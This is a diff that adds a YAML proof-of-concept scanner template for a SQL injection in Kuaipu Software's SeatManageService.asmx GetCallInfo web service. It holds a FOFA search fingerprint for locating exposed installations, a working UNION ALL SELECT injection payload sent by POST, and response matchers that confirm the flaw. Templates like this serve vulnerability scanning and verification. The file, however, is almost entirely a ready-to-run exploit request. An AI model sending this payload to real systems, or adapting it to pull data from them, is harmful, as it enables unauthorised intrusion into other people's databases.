@@ -1,0 +1,27 @@
+id: poc-yaml-kuaipu-seatmanageservice-asmx-sqli
+info:
+  name: 快普软件 SeatManageService.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 快普软件
+  fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WebService/SeatManageService.asmx/GetCallInfo
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: strCallNo=a%27+UNION+ALL+SELECT+NULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
+  expression: 'status_code == 200 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"</string>") &&
+
+    contains(content_type,"text/xml")
+
+    '
+transport: http
